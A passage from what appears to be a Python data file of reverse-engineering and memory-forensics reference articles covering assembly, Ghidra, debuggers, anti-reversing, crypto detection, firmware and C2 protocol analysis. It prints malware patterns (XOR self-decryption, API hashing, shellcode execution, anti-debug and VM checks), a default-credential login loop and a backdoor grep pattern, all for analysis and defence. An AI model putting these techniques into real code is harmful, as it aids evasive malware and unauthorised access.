64-bit: `RAX–R15`. `EAX` = low 32 of `RAX`; `AX` = low 16; `AL`/`AH` = byte halves. Additional `R8–R15`.

### EFLAGS Key Bits

| Flag | Set When |
|---|---|
| ZF | Result is zero |
| CF | Unsigned overflow/borrow |
| SF | Result is negative |
| OF | Signed overflow |

## Calling Conventions

```asm
; x86 cdecl (args pushed right-to-left, caller cleans):
push arg3
push arg2
push arg1
call function
add esp, 12       ; clean 3 * 4 bytes
; return value in EAX

; x64 Windows (first 4 args: RCX RDX R8 R9, shadow space required):
sub rsp, 32       ; 32-byte shadow space
call function
add rsp, 32
; return in RAX

; x64 Linux (first 6 args: RDI RSI RDX RCX R8 R9):
; callee-saved: RBX RBP R12-R15
```

## Essential Instructions

```asm
; Data movement
mov eax, 0x10        ; immediate
mov eax, [esp+4]     ; dereference (memory read)
mov [ebp-8], eax     ; memory write
lea eax, [ebp-8]     ; load address (no memory access)
movsx eax, byte [ebp-1] ; sign-extend byte->dword
movzx eax, byte [ebp-1] ; zero-extend byte->dword

; Arithmetic
add eax, ebx    ; eax += ebx
sub eax, 1      ; eax -= 1
inc/dec eax     ; ±1
imul eax, ebx   ; signed multiply
mul ebx         ; unsigned EDX:EAX = EAX*EBX
neg eax         ; negate (two's complement)

; Logic
and eax, 0xFF   ; mask
or  eax, 0x01   ; set bits
xor eax, eax    ; zero (canonical idiom)
xor eax, key    ; XOR decrypt
shl eax, 2      ; multiply by 4
shr eax, 1      ; unsigned divide by 2
sar eax, 1      ; signed divide by 2
rol/ror eax, 8  ; rotate

; Comparison
cmp eax, 0      ; sets flags (ZF if equal)
test eax, eax   ; AND without store (tests zero)
je/jne/jz/jnz  ; conditional jumps
jl/jle/jg/jge  ; signed comparisons
jb/ja           ; unsigned below/above

; Stack
push eax         ; esp-=4; [esp]=eax
pop  eax         ; eax=[esp]; esp+=4
pushad/popad     ; push/pop all GP regs (x86)
call func        ; push eip; jmp func
ret              ; pop eip
leave            ; mov esp,ebp; pop ebp
```

## Function Frame Patterns

```asm
; x86 standard prologue/epilogue:
push ebp
mov  ebp, esp
sub  esp, 0x20       ; local vars at [ebp-4], [ebp-8], ...
                     ; args at [ebp+8], [ebp+12], ...
leave
ret

; x64 Windows:
push rbp
mov  rbp, rsp
sub  rsp, 0x30       ; locals + shadow space + alignment
add  rsp, 0x30
pop  rbp
ret
```

## Malware Code Patterns

### XOR Decrypt Loop

```asm
mov ecx, 0x200       ; length
mov esi, cipher_buf  ; pointer
mov al,  0x5A        ; single-byte key
.loop:
    xor [esi], al
    inc esi
    loop .loop       ; dec ecx; jnz .loop
jmp cipher_buf       ; jump to decrypted code
```

### Anti-Debug Timing

```asm
rdtsc              ; EDX:EAX = CPU cycle count
mov [t1], eax
; ... few instructions ...
rdtsc
sub eax, [t1]
cmp eax, 500000    ; large gap = single-stepping in debugger
jg  debugger_detected
```

### Dynamic API Resolution

```asm
push 0xDEAD1234    ; hash of "VirtualAlloc"
call resolve_hash  ; walks PEB→LDR→kernel32 EAT
; EAX = VirtualAlloc address (no import entry in IAT)
call eax
```

## Quick Idiom Reference

| Pattern | Meaning |
|---|---|
| `xor eax, eax` | eax = 0 |
| `test eax, eax` + `jz` | if (eax == 0) |
| `push ebp; mov ebp, esp` | Function prologue |
| `leave; ret` | Function epilogue |
| `rep movsb` | memcpy(edi, esi, ecx) |
| `rep stosd` | memset(edi, eax, ecx*4) |
| `repne scasb` | strlen idiom |
| `pushad; ...; popad; jmp` | Packer OEP stub |
""",
    },
    {
        "title": "Ghidra Fundamentals — Navigation, Decompilation, Scripting",
        "tags": ["ghidra", "reverse-engineering", "decompilation", "malware-analysis"],
        "content": """# Ghidra Fundamentals

## Installation

```bash
# Requires JDK 17+. Download from https://ghidra-sre.org/
# Windows: ghidraRun.bat
# Linux:   ./ghidraRun

# Project: File > New Project > Non-Shared
# Import:  File > Import File
# Analyze: Auto Analysis dialog > keep defaults > Analyze
```

## Core Windows

| Window | Purpose |
|---|---|
| Listing | Disassembly |
| Decompiler | C pseudo-code (Ctrl+E) |
| Symbol Table | All imports, exports, labels |
| Functions | All functions with sizes |
| Data Type Manager | Struct/typedef library |
| Memory Map | Segment layout |

## Navigation

```
G              Go to address or symbol
Ctrl+G         Go to function by name
Alt+←/→        Back/Forward in history
X              Cross-references for symbol at cursor
Ctrl+Shift+F   References window
F              Edit function (rename, signature)
L              Rename variable/label
Ctrl+L         Retype variable
Ctrl+F         Search in listing
Ctrl+D         Bookmark
```

## Analysis Workflow

```
1. Load binary, run auto-analysis
2. Apply Windows types: Window > Data Type Manager > Open Archive >
   windows_vs12_32.gdt (or 64.gdt)
3. Find entry point → rename function (F)
4. Follow suspicious imports (Symbol Table > filter > X for refs)
5. In Decompiler: rename vars (L), retype (Ctrl+L), rename functions (F)
6. Repeat until logic is clear
```

### Decompiler Example

```c
// Raw:
undefined4 FUN_00401000(void) {
    int iVar1 = FUN_00405000(0x100);
    if (iVar1 != 0) FUN_00406000(iVar1, DAT_00408000);
}

// After analysis:
BOOL DownloadAndExecute(void) {
    LPVOID pBuf = VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuf) memcpy(pBuf, g_shellcode, 0x100);
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pBuf, NULL, 0, NULL);
}
```

## Crypto Detection

```
# AES S-box: Search > For Bytes > 63 7C 77 7B F2 6B 6F C5
# FindCrypt extension (auto-labels all crypto constants):
  Help > Install Extensions > findcrypt-ghidra
  Analysis > One Shot > Find Crypto Constants

# RC4 KSA: look for two consecutive 256-iteration loops
# First: trivial S[i]=i init
# Second: j=(j+S[i]+key[i%len])%256; swap(S[i],S[j])
```

## Scripting — Java

```java
// ListInjectionAPIs.java
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.*;
import ghidra.program.model.symbol.*;

public class ListInjectionAPIs extends GhidraScript {
    String[] APIS = {"VirtualAllocEx","WriteProcessMemory",
                     "CreateRemoteThread","NtCreateThreadEx","QueueUserAPC"};
    public void run() throws Exception {
        SymbolTable st = currentProgram.getSymbolTable();
        ReferenceManager rm = currentProgram.getReferenceManager();
        for (String api : APIS) {
            for (Symbol sym : (Iterable<Symbol>)st.getSymbols(api)::iterator) {
                for (Reference ref : rm.getReferencesTo(sym.getAddress())) {
                    Function f = getFunctionContaining(ref.getFromAddress());
                    println(api+" called from "+(f!=null?f.getName():"?")+" at "+ref.getFromAddress());
                }
            }
        }
    }
}
```

## Scripting — Python (Jython)

```python
# FindURLs.py — list all URL strings and their callers
from ghidra.program.model.data import StringDataType
for data in currentProgram.getListing().getDefinedData(True):
    if not isinstance(data.getDataType(), StringDataType): continue
    v = str(data.getValue())
    if not v.startswith("http"): continue
    addr = data.getAddress()
    for ref in getReferencesTo(addr):
        f = getFunctionContaining(ref.getFromAddress())
        print(f"{v} <- {ref.getFromAddress()} in {f.getName() if f else '?'}")
```

## Headless Analysis

```bash
$GHIDRA_HOME/support/analyzeHeadless /tmp/projects MyProj \
  -import malware.exe \
  -postScript ListInjectionAPIs.java \
  -scriptPath /opt/scripts/ \
  -log /tmp/analysis.log \
  -deleteProject
```
""",
    },
    {
        "title": "Debugging with x64dbg and WinDbg — Breakpoints, Tracing, Memory",
        "tags": ["x64dbg", "windbg", "debugging", "reverse-engineering", "malware-analysis"],
        "content": """# Debugging with x64dbg and WinDbg

## x64dbg Setup

```
Download: https://x64dbg.com/
Plugins:
  ScyllaHide  — anti-anti-debug
  xAnalyzer   — auto-comment API parameters
  ret-sync    — sync with Ghidra/IDA

Options > Preferences > Events:
  [x] Break on entry point
  [x] Break on TLS callbacks

ScyllaHide > Options:
  Enable all NtQueryInformationProcess hooks
  Enable IsDebuggerPresent, Heap Flags, GetTickCount, RDTSC patches
```

## Breakpoint Types

| Type | How to Set | Best For |
|---|---|---|
| Software (INT3) | F2 or `bp addr` | General use |
| Hardware Execute | Right-click > Breakpoint > Hardware | Anti-debug bypass (invisible to memory scan) |
| Hardware Write | `bph addr, w, 4` | Detect when buffer is written |
| Conditional | Set BP > Edit > Condition | Filter by register value |

```
Hardware BP examples (max 4 simultaneous):
bph 0x401000                 ; execute
bph 0x405000, rw, 4          ; read/write 4 bytes
bph 0x405000, w,  1          ; write 1 byte

Conditional (break on CreateFile only for specific name):
Condition: [rdx] == 0x006D0061   ; "am" in UTF-16
```

## Execution Control

| Action | Shortcut |
|---|---|
| Run | F9 |
| Step Into | F7 |
| Step Over | F8 |
| Run Until Return | Ctrl+F9 |
| Run to Cursor | F4 |
| Restart | Ctrl+F2 |
| Pause | F12 |

## OEP Finding (Packed Samples)

```
1. Run until initial setup done
2. Memory Map (Alt+M) — find large RWX section (unpacked payload)
3. Right-click section > Set Memory Breakpoint on Execution
4. F9 — packer decompresses → jumps to OEP → debugger breaks
5. Confirm: entropy should now be normal in dump window
6. Plugins > Scylla > IAT Autosearch > Get Imports > Dump > Fix Dump
7. Analyze unpacked binary statically
```

## Tracing

```
Debug > Trace Into / Trace Over (records all executed instructions)
View > Trace — review instruction history

Command bar:
tic  eax==0x100, 100000   ; trace into until eax==0x100 or 100000 steps
tocnd zf==1, 50000         ; trace over until ZF set
```

## WinDbg — Kernel Debugging

```
# Target VM setup:
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4

# Connect:
windbg -k net:port=50000,key=1.2.3.4

# Symbols:
.symfix C:\Symbols
.sympath+ srv*C:\Symbols*https://msdl.microsoft.com/download/symbols
.reload /f
```

### Key WinDbg Commands

```windbg
!process 0 0              ; all processes (brief)
!process 0 7 malware.exe  ; detailed for specific name
~*k                        ; all threads, all stacks
!analyze -v               ; crash analysis

db addr L?10              ; dump bytes
dd addr L?4               ; dump dwords
da addr                   ; ASCII string
du addr                   ; Unicode string

bp nt!NtCreateFile         ; kernel function breakpoint
ba e 1 addr                ; hardware execute BP
ba w 4 addr                ; hardware write BP

lm                        ; all modules
!drvobj \Driver\name    ; driver object details
```

### Rootkit Detection (WinDbg)

```windbg
; DKOM hidden processes:
!process 0 0          ; via EPROCESS list (manipulable)
!poolfind Proc 2      ; pool scan for EPROCESS (bypasses DKOM)
; Objects in pool scan but not in !process = hidden

; SSDT hooks:
dq nt!KiServiceTable L?100
; Entries outside ntoskrnl range = hooked
lm m ntoskrnl         ; get range to compare against
```
""",
    },
    {
        "title": "Anti-Reversing Techniques — Anti-Debug, VM Detection, Obfuscation",
        "tags": ["anti-debug", "anti-reversing", "vm-detection", "obfuscation", "malware-analysis"],
        "content": """# Anti-Reversing Techniques

## Anti-Debug Techniques

### IsDebuggerPresent / PEB Check

```c
// Reads PEB.BeingDebugged byte (PEB + 0x02)
if (IsDebuggerPresent()) ExitProcess(0);

// Bypass: ScyllaHide patches automatically
// Manual: Memory Map > find PEB (gs:[0x60]) > set byte at offset 0x02 to 0
```

### NtQueryInformationProcess

```c
// ProcessDebugPort (class 7) = 0xFFFFFFFF when debugger attached
DWORD port = 0;
NtQueryInformationProcess(GetCurrentProcess(), 7, &port, 4, NULL);
if (port != 0) ExitProcess(0);

// Bypass: ScyllaHide hooks NtQueryInformationProcess in ntdll
```

### Timing Checks

```c
DWORD t1 = GetTickCount();
// ... code ...
if (GetTickCount() - t1 > 100) ExitProcess(0);  // Too slow = debugger

// RDTSC (more precise):
if (__rdtsc() - t1 > 500000) ExitProcess(0);

// Bypass: NOP out the CMP+JG, or ScyllaHide patches timing functions
```

### INT3 SEH Check

```c
__try {
    __asm int 3
    ExitProcess(0);          // Reached if debugger intercepts INT3
} __except(EXCEPTION_EXECUTE_HANDLER) {
    continue_normally();     // Reached without debugger
}
// Bypass: Options > Exceptions > add 0x80000003 to "pass to program"
```

### Heap Flags

```c
// PEB.NtGlobalFlag = 0x70 under debugger (heap validation enabled)
DWORD flags = *(DWORD*)((char*)PEB + 0x68);  // x86 offset
if (flags & 0x70) ExitProcess(0);

// Bypass: patch PEB.NtGlobalFlag to 0x00 in memory dump view
```

## VM Detection

### Registry Artifacts

```c
static const char* vmKeys[] = {
    "SOFTWARE\VMware, Inc.\VMware Tools",
    "SOFTWARE\Oracle\VirtualBox Guest Additions"
};
// Bypass: delete these keys from the analysis VM
```

### CPUID Hypervisor Bit

```asm
mov eax, 1
cpuid
bt  ecx, 31          ; bit 31 = hypervisor present flag
jc  vm_detected

; EAX=0x40000000: hypervisor vendor string
; VMware = "VMwareVMware", VirtualBox = "VBoxVBoxVBox"
; Bypass: patch CPUID result, or use bare-metal analysis
```

### User Activity Heuristics

```c
ULONGLONG ticks = GetTickCount64();
if (ticks < 300000) ExitProcess(0);   // < 5 min uptime = sandbox

// Also checks: desktop file count, browser history, screen resolution
// Bypass: FLARE-VM has pre-populated user artifacts
//         Patch GetTickCount64 return value
```

## Code Obfuscation

### Control Flow Flattening

```c
// All logic hidden behind dispatcher switch:
int state = 0;
while (true) {
    switch (state) {
        case 0: state = condition ? 1 : 2; break;
        case 1: do_A(); state = 3; break;
        case 2: do_B(); state = 3; break;
        case 3: do_C(); return;
    }
}
// Bypass: dynamic trace execution path, ignore dispatcher boilerplate
```

### Opaque Predicates

```asm
mov eax, 6
imul eax, eax, eax  ; eax=36 (always even)
and eax, 1          ; always 0
jz  real_code       ; always taken — dead bytes below confuse disassembler
db 0xEB, 0x05       ; garbage bytes
real_code:
```

### Junk Code

```asm
push eax        ; junk
pop  eax        ; junk (net zero)
mov  eax, [ebp-4]  ; REAL
push ebx        ; junk
pop  ebx        ; junk
mov  [ebp-8], eax  ; REAL
; Decompiler absorbs junk automatically — focus on pseudo-code output
```

## Practical Bypass Workflow

```
1. ScyllaHide (covers ~80% of common techniques)
2. Remaining timing checks: NOP the CMP+JG comparison
3. CPUID checks: single-step to CPUID, manually clear ECX bit 31
4. Environment hardening:
   - Delete VM registry keys
   - Rename analysis tools
   - Set resolution 1920x1080
   - Use FLARE-VM for pre-built clean environment
   - Run malware > 5 minutes for uptime checks
```
""",
    },
    {
        "title": "Identifying Crypto in Binaries — AES, RC4, XOR, Custom Ciphers",
        "tags": ["cryptography", "aes", "rc4", "xor", "reverse-engineering", "malware-analysis"],
        "content": """# Identifying Crypto in Binaries

## XOR

### Detection

```python
# Most common byte XOR 0x20 (space) = likely single-byte key:
with open("blob.bin","rb") as f: data = f.read()
counts = {}
for b in data: counts[b] = counts.get(b,0)+1
mc = max(counts, key=counts.get)
print(f"Most common: 0x{mc:02X}, possible key: 0x{mc ^ 0x20:02X}")
```

```bash
pip install xortool
xortool -l 256 -c 20 blob.bin         # Guess key length
xortool -x 5A blob.bin -o plain.bin   # Decrypt with key 0x5A
```

### In Disassembly

```asm
mov ecx, length; mov esi, buf; mov al, key
.loop: xor [esi], al; inc esi; loop .loop
; Single-byte XOR loop — look for this near decryption code
```

## RC4

```python
# KSA pattern: two consecutive 256-iteration loops
# First: S[i] = i (trivial); Second: j=(j+S[i]+key[i%len])%256; swap

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i=(i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```

## AES

### S-Box Detection

```
First 8 bytes of AES S-box: 63 7C 77 7B F2 6B 6F C5
```

```bash
python3 -c "
sbox = bytes([0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5])
data = open('malware.exe','rb').read()
off = data.find(sbox)
print(f'AES S-box at 0x{off:X}' if off != -1 else 'Not found')
"

# Ghidra: Search > For Bytes > 63 7C 77 7B F2 6B 6F C5
# CAPA: capa malware.exe | grep -i aes
# FindCrypt plugin: auto-labels all AES constants
```

### Decryption

```python
from Crypto.Cipher import AES
key = bytes.fromhex("0011223344556677889aabbccddeeff0")
# CBC:
pt = AES.new(key, AES.MODE_CBC, bytes(16)).decrypt(ct)
# ECB:
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
# GCM: AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt(ct)
```

## ChaCha20 / Salsa20

```python
# Sigma constant: b"expand 32-byte k"
sigma = b"expand 32-byte k"
data = open("malware.exe","rb").read()
off = data.find(sigma)
if off != -1: print(f"ChaCha20/Salsa20 at 0x{off:X}")

from Crypto.Cipher import ChaCha20
pt = ChaCha20.new(key=key_32b, nonce=nonce_12b).decrypt(ct)
```

## Custom Cipher Analysis

```
1. Find cipher function: trace backward from send()/WriteFile()
2. Identify operations: XOR = stream; array lookup = S-box; block size 16 = AES-like
3. Extract key: check .rdata section or BP at cipher function entry, read key arg
4. Implement in Python, verify with known plaintext
5. Decrypt all captured traffic
```

## CyberChef Quick Reference

```
URL: https://gchq.github.io/CyberChef/

XOR:  From Hex > XOR (Key: AB, Scheme: Standard)
AES:  From Hex > AES Decrypt (Key: hex, IV: hex, Mode: CBC)
RC4:  From Hex > RC4 (Passphrase: hex key, Encoding: Hex)
PS:   From Base64 > Decode text (UTF-16LE)
```
""",
    },
    {
        "title": "Firmware Analysis — Extraction, Filesystem, QEMU Emulation",
        "tags": ["firmware", "iot", "embedded", "binwalk", "qemu", "reverse-engineering"],
        "content": """# Firmware Analysis

## Acquisition

```bash
# From vendor website: download update file
file firmware.bin
xxd firmware.bin | head -2   # Identify format by magic bytes

# UART serial console (most common hardware method):
screen /dev/ttyUSB0 115200   # Connect USB-to-TTL adapter
# Interrupt U-Boot autoboot to get root shell

# SPI flash chip reading:
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r dump.bin
```

## Binwalk

```bash
# Scan:
binwalk firmware.bin
# 0x0        TRX header
# 0x1C       LZMA compressed data
# 0x200000   Squashfs filesystem (little endian, 4.0)

# Entropy visualization (find encrypted regions):
binwalk -E firmware.bin

# Architecture scan:
binwalk -A firmware.bin   # "MIPS instructions", "ARM thumb", etc.

# Extract:
binwalk -e  firmware.bin        # Single pass
binwalk -eM firmware.bin        # Recursive

# Non-standard SquashFS:
sasquatch firmware.squashfs
jefferson filesystem.jffs2 -d output/
```

## Filesystem Security Analysis

```bash
cd squashfs-root/

# Hardcoded credentials:
grep -rn "password\|passwd" etc/ --include="*.conf" --include="*.xml" 2>/dev/null
cat etc/passwd; cat etc/shadow

# Private keys:
find . -name "*.pem" -o -name "*.key" 2>/dev/null
grep -rl "BEGIN RSA PRIVATE KEY" . 2>/dev/null

# Startup scripts:
cat etc/inittab; cat etc/rc.local; ls etc/init.d/
grep -r "telnet\|nc -l\|backdoor" etc/ 2>/dev/null

# Vulnerable C functions:
find . -executable -type f | xargs strings 2>/dev/null | \
  grep -E "\bstrcpy\b|\bsprintf\b|\bgets\b" | head -20

# Checksec all binaries:
find . -executable -type f | xargs checksec 2>/dev/null

# Automated scan:
git clone https://github.com/craigz28/firmwalker
./firmwalker/firmwalker.sh squashfs-root/ results.txt
```

## QEMU Emulation

### User-Mode (Easiest)

```bash
apt install qemu-user qemu-user-static
file squashfs-root/bin/busybox  # Determine arch: MIPS/ARM/x86

cp $(which qemu-mipsel-static) squashfs-root/usr/bin/
sudo chroot squashfs-root/ /bin/sh

# Now run firmware binaries:
/usr/sbin/httpd -p 8080 &
```

### FAT — Firmware Analysis Toolkit

```bash
git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
sudo ./setup.sh
sudo ./fat.py /path/to/firmware.bin
# Auto-detects arch, sets up QEMU, prints IP for connection
curl http://<qemu_ip>/
nmap -sV <qemu_ip>
```

## Vulnerability Discovery

```bash
# CGI command injection:
grep -rn "system\|popen\|exec(" squashfs-root/www/cgi-bin/ 2>/dev/null

# Default credential testing:
for cred in admin:admin admin:password root:root; do
  u=${cred%%:*}; p=${cred##*:}
  echo -n "$cred -> "
  curl -s -o /dev/null -w "%{http_code}" -u "$u:$p" http://<ip>/
  echo
done
```
""",
    },
    {
        "title": "Reverse Engineering Network Protocols from Binary Traffic",
        "tags": ["network-protocols", "reverse-engineering", "wireshark", "scapy", "malware-analysis"],
        "content": """# Reverse Engineering Network Protocols

## Traffic Capture

```bash
sudo tcpdump -i tap0 -w session.pcap -s 0
# Run malware in isolated VM; all traffic routed through host TAP
```

## Protocol Fingerprinting

```python
from scapy.all import rdpcap, TCP, IP, Raw
packets = rdpcap("session.pcap")
streams = {}
for pkt in packets:
    if IP in pkt and TCP in pkt and Raw in pkt:
        conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        streams.setdefault(conn, []).append(bytes(pkt[Raw]))
for conn, payloads in streams.items():
    print(f"{conn[0]}:{conn[1]} -> {conn[2]}:{conn[3]}")
    for i, p in enumerate(payloads[:3]):
        print(f"  [{i}] {p[:32].hex()}")
# Consistent first 4 bytes = magic; bytes 4-5 = command; 6-7 = length
```

## Correlating Traffic with Disassembly

```
x64dbg:
1. BP on ws2_32.send
2. At break: second arg (buf) at [esp+8] or RDX
3. Follow buf in dump = data BEFORE encryption
4. Ctrl+F9 (run to return), check same buf = encrypted
5. Call stack shows encryption wrapper function

Ghidra:
1. Symbol Table > filter "send" > XREFs
2. Trace backward from buf arg to message builder function
```

## Message Structure Recovery

```python
import struct

MAGIC    = 0xDEADBEEF
CMD_EXEC = 0x0001
CMD_RESP = 0x0002

def build(msg_type, payload):
    return struct.pack(">IHH", MAGIC, msg_type, len(payload)) + payload

def parse(data):
    magic, msg_type, length = struct.unpack_from(">IHH", data)
    assert magic == MAGIC
    return msg_type, data[8:8+length]
```

## Known-Plaintext Key Recovery

```python
# If plaintext starts with magic DE AD BE EF:
ct = bytes.fromhex("9bc3f1a2...")
kp = bytes([0xDE, 0xAD, 0xBE, 0xEF])
key_start = bytes([ct[i] ^ kp[i] for i in range(len(kp))])
print(f"Key: {key_start.hex()}")
# Extend by decrypting additional known sections
```

## Wireshark Lua Dissector

```lua
-- ~/.config/wireshark/plugins/custom_c2.lua
local proto = Proto("CustomC2","Custom C2")
local f_magic = ProtoField.uint32("cc2.magic","Magic",base.HEX)
local f_cmd   = ProtoField.uint16("cc2.cmd","Cmd",base.HEX)
local f_len   = ProtoField.uint16("cc2.len","Len",base.DEC)
local f_data  = ProtoField.bytes ("cc2.data","Data")
proto.fields  = {f_magic,f_cmd,f_len,f_data}

local CMDS = {[1]="Execute",[2]="Response",[3]="Heartbeat"}

function proto.dissector(buf,pinfo,tree)
    if buf:len() < 8 then return end
    if buf(0,4):uint() ~= 0xDEADBEEF then return end
    pinfo.cols.protocol = "CustomC2"
    local t = tree:add(proto,buf(),"Custom C2")
    t:add(f_magic,buf(0,4)); t:add(f_cmd,buf(4,2)); t:add(f_len,buf(6,2))
    local n = buf(6,2):uint()
    if n > 0 and buf:len() >= 8+n then t:add(f_data,buf(8,n)) end
    local cmd = buf(4,2):uint()
    pinfo.cols.info = "CustomC2 "..(CMDS[cmd] or string.format("0x%04x",cmd))
end
DissectorTable.get("tcp.port"):add(4444,proto)
```

## Detection Rules

```suricata
alert tcp any any -> any 4444 (
    msg:"Custom C2 Magic Bytes";
    content:"|DE AD BE EF|"; depth:4;
    flow:established,to_server;
    classtype:trojan-activity;
    sid:9000001; rev:1;
)
```

```zeek
# Zeek script:
event tcp_contents(c: connection, is_orig: bool, seq: count, contents: string) {
    if ( |contents| >= 4 && contents[0:4] == "\xde\xad\xbe\xef" )
        NOTICE([$note=Notice::Weird,$conn=c,
                $msg=fmt("Custom C2 from %s to %s:%d",
                         c$id$orig_h,c$id$resp_h,c$id$resp_p)]);
}
```
""",
    },
]


MEMORY_FORENSICS = [
    {
        "title": "Volatility 3 Framework — Installation, Plugins, Profiles",
        "tags": ["volatility", "memory-forensics", "dfir", "incident-response"],
        "content": """# Volatility 3 Framework

## Installation

```bash
pip install volatility3
# Or from source:
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3 && pip install -r requirements.txt

# Additional plugins:
pip install pycryptodome yara-python capstone
```

## Symbol Tables

Volatility 3 auto-downloads Windows symbols on first use (cached in `~/.cache/volatility3/symbols/`). For air-gapped environments, download pre-built symbol packs from https://downloads.volatilityfoundation.org/volatility3/symbols/ and extract to `volatility3/symbols/`.

## Basic Command Pattern

```bash
vol.py -f memory.raw <os>.<plugin> [args]

# Image information:
vol.py -f memory.raw windows.info

# Process listing:
vol.py -f memory.raw windows.pslist
vol.py -f memory.raw windows.pstree
vol.py -f memory.raw windows.psscan       # Pool-tag scan (bypasses DKOM)
vol.py -f memory.raw windows.cmdline      # Full command lines

# Network:
vol.py -f memory.raw windows.netscan

# Injection detection:
vol.py -f memory.raw windows.malfind
vol.py -f memory.raw windows.malfind --pid 1234

# Registry:
vol.py -f memory.raw windows.registry.hivelist
vol.py -f memory.raw windows.registry.printkey \
    --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# Kernel:
vol.py -f memory.raw windows.ssdt
vol.py -f memory.raw windows.driverscan
vol.py -f memory.raw windows.modules

# Linux:
vol.py -f memory.raw linux.pslist
vol.py -f memory.raw linux.bash    # Bash history from memory
vol.py -f memory.raw linux.netstat
```

## Output Formats

```bash
vol.py -f memory.raw windows.pslist                 # Table (default)
vol.py -f memory.raw windows.pslist --output json   # JSON for scripting
vol.py -f memory.raw windows.netscan | grep ESTABLISHED
vol.py -f memory.raw windows.cmdline | grep -i "encoded\|bypass\|hidden"
```

## Triage Script

```bash
for plugin in pslist psscan pstree cmdline netscan malfind; do
    echo "=== $plugin ===" >> triage.txt
    vol.py -f memory.raw windows.$plugin >> triage.txt 2>&1
done
```
""",
    },
    {
        "title": "Process Analysis — pslist, pstree, Process Hollowing Detection",
        "tags": ["volatility", "process-analysis", "process-hollowing", "memory-forensics", "dfir"],
        "content": """# Process Analysis in Memory

## Process Listing Commands

```bash
vol.py -f memory.raw windows.pslist    # ActiveProcessLinks traversal
vol.py -f memory.raw windows.psscan   # Pool-tag scan (bypasses DKOM)
vol.py -f memory.raw windows.pstree   # Hierarchical view

# Find hidden processes (psscan - pslist):
comm -23 \
  <(vol.py -f mem.raw windows.psscan | awk '{print $1}' | sort) \
  <(vol.py -f mem.raw windows.pslist | awk '{print $1}' | sort)
```

## Suspicious Process Indicators

### Unusual Parent-Child Relationships

```
LEGITIMATE:
  wininit.exe → services.exe, lsass.exe
  services.exe → svchost.exe (multiple)
  explorer.exe → user applications

SUSPICIOUS:
  svchost.exe   parent = explorer.exe or cmd.exe
  lsass.exe     parent = anything other than wininit.exe
  powershell.exe parent = WINWORD.EXE or EXCEL.EXE
  cmd.exe        parent = svchost.exe (no obvious service)
  mshta.exe/wscript.exe parent = Office applications
```

```bash
vol.py -f memory.raw windows.pstree
# Inspect parent-child chains for anomalous branches
```

### Masquerading

```bash
vol.py -f memory.raw windows.cmdline | grep -i "svchost\|lsass\|csrss"
# Legitimate: C:\Windows\System32\svchost.exe
# Suspicious:  C:\Users\user\AppData\Temp\svchost.exe
```

## Process Hollowing Detection

### What It Is

Legitimate process started suspended → original code unmapped → malicious code written → resumed.

### Detection Steps

```bash
# 1. malfind — find RWX private allocations with MZ header:
vol.py -f memory.raw windows.malfind --pid <pid>
# VadS + PAGE_EXECUTE_READWRITE + MZ header = injected PE

# 2. VAD analysis — hollowed process has private executable regions:
vol.py -f memory.raw windows.vadinfo --pid <pid>
# Look for VadS (private, no mapped file) that are executable

# 3. Dump and compare:
vol.py -f memory.raw windows.procdump --pid <pid>
sha256sum procdump.*.exe
# Compare to known-good hash of svchost.exe from clean system
```

### VAD Tags

| Tag | Meaning |
|---|---|
| VadS | Private allocation (no file backing) |
| VadF | File-backed mapping |
| Vad | Standard VAD node |

VadS + executable + large size = injection indicator.

## DLL Injection Detection

```bash
vol.py -f memory.raw windows.handles --pid <injecting_pid> | grep Process
# Shows open handles to other processes (step 1 of injection)

vol.py -f memory.raw windows.dlllist --pid <target_pid>
# Look for DLLs in unusual paths (%TEMP%, %APPDATA%, C:\ProgramData)
```

## Process Dump and Analysis

```bash
vol.py -f memory.raw windows.procdump --pid 1234       # Dump .exe
vol.py -f memory.raw windows.memmap --pid 1234 --dump  # Full address space
vol.py -f memory.raw windows.dlllist --pid 1234 --dump # All loaded DLLs

# Analyze dump:
die procdump.1234.exe
strings procdump.1234.exe | grep -E "http|cmd|powershell"
yara -r rules/ procdump.1234.exe
```
""",
    },
    {
        "title": "Detecting Code Injection — malfind, VAD Analysis, Hollowed Processes",
        "tags": ["code-injection", "malfind", "vad", "memory-forensics", "volatility"],
        "content": """# Detecting Code Injection

## Injection Technique Reference

| Technique | Key APIs | Detection |
|---|---|---|
| Classic DLL injection | CreateRemoteThread + LoadLibrary | Unexpected DLL in dlllist |
| Shellcode injection | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | RWX VadS region |
| Process hollowing | CreateProcess(SUSPENDED) + ZwUnmapViewOfSection + WPM | VadS at image base, hash mismatch |
| Reflective DLL | Custom PE loader (no import) | MZ in VadS private region |
| Atom bombing | GlobalAddAtom + NtQueueApcThread | APC queue artifacts |

## malfind Plugin

```bash
vol.py -f memory.raw windows.malfind
vol.py -f memory.raw windows.malfind --pid 1234
vol.py -f memory.raw windows.malfind --dump   # Dump suspicious regions
```

### Output Interpretation

```
PID: 1234  Process: svchost.exe
Start: 0x3c0000  End: 0x43ffff
Tag: VadS  Protection: PAGE_EXECUTE_READWRITE
Hexdump: 4d 5a 90 00 03 00 ...   ← MZ = injected PE!

MZ header in VadS = injected PE (DLL or EXE)
Shellcode bytes (no MZ) = position-independent code
PAGE_EXECUTE_READ_WRITE in browser = likely JIT (false positive)
```

## VAD Tree Analysis

```bash
vol.py -f memory.raw windows.vadinfo --pid 1234

# Find executable VadS regions:
vol.py -f memory.raw windows.vadinfo --pid 1234 | awk '
